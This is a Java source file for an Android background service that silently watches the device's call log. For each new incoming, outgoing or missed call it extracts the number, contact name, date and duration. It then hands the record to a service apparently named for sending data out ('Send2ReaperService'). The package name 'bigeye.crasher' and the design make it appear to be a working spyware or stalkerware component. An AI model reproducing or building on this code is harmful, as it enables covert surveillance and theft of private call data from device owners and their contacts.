package com.bigeye.crasher;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.text.format.DateFormat;
import android.util.Log;

public class MonitorCallLogsService extends Service {
	public String APP_TAG = "MonitorCallLogsService";
	
	ContentResolver contentResolver;
	ContentObserver callLogContentObserver;

	@Override
	public int onStartCommand(Intent intent, int flags, int startId){
		Log.i(APP_TAG,"Starting call log service ...");
		return START_STICKY;
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate(){
		super.onCreate();
		
		contentResolver = getContentResolver();
		
		callLogContentObserver = new ContentObserver(new Handler()) {
		
			@Override
			public void onChange(boolean selfChange){
				Uri logURI = Uri.parse("content://call_log/calls");
				final String[] projection = null;
				final String selection[] = { "type = "+android.provider.CallLog.Calls.INCOMING_TYPE+" AND new = "+1,
						"type = "+android.provider.CallLog.Calls.OUTGOING_TYPE,
						"type = "+android.provider.CallLog.Calls.MISSED_TYPE+" AND new = "+1 };
				final String[] selectionArgs = null;
				String sortOrder = null;
				Cursor[] c = new Cursor[3];
				
				//incoming calls
				c[0] = getContentResolver().query(logURI, projection, selection[0], selectionArgs, sortOrder);
				
				//outgoing calls
				sortOrder = android.provider.CallLog.Calls.DATE + " DESC LIMIT 1";
				c[1] = getContentResolver().query(logURI, projection, selection[1], selectionArgs, sortOrder);
				
				//missed calls
				sortOrder = null;
				c[2] = getContentResolver().query(logURI, projection, selection[2], selectionArgs, sortOrder);
				
				for(Cursor cursor : c){
					
					if(cursor.getCount() > 0 ){
						
						cursor.moveToFirst();
						
						//phone no
						String phoneNo = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
						String name = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
						
						name = (name!=null) ? name : "uknown";
						
						//date
//						String callDate = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DATE));
						long CDate = cursor.getLong(cursor.getColumnIndex(android.provider.CallLog.Calls.DATE));
						String callDate = new DateFormat().format("dd-MMM-yyyy k:m:s", CDate).toString();
						
						//duration
						String duration = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION));
						
						//call type - 1-incoming,2-outgoing,3-missed
						String callType = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE));

						String callLog = "";
						if(callType.equalsIgnoreCase(String.valueOf(android.provider.CallLog.Calls.INCOMING_TYPE))){
							callLog = "New Incoming call from: "+"<"+name+">"+phoneNo;
						}else if (callType.equalsIgnoreCase(String.valueOf(android.provider.CallLog.Calls.OUTGOING_TYPE))){
							callLog = "New Outgoing call to: "+"<"+name+">"+phoneNo;
						}else if (callType.equalsIgnoreCase(String.valueOf(android.provider.CallLog.Calls.MISSED_TYPE))){
							callLog = "New Missed call from: "+"<"+name+">"+phoneNo;
						}
						
						callLog += " on "+callDate+" duration: "+duration+" secs.";

						Log.i(APP_TAG,callLog);
						
						//send to repo
						Intent repo = new Intent(getApplicationContext(),Send2ReaperService.class);
						repo.putExtra("OPERATION", "OUTGOING");
						repo.putExtra("MSG",callLog);
						startService(repo);

					}else{
						Log.i(APP_TAG,"count: "+cursor.getCount());
					}
				
					cursor.close();
					
				}
				
			}
			
			@Override
			public boolean deliverSelfNotifications(){
				return true;
			}
		};

		contentResolver.registerContentObserver(android.provider.CallLog.Calls.CONTENT_URI, true, callLogContentObserver);
		
	}
	
	@Override
	public void onDestroy(){
		super.onDestroy();
	}
	
}
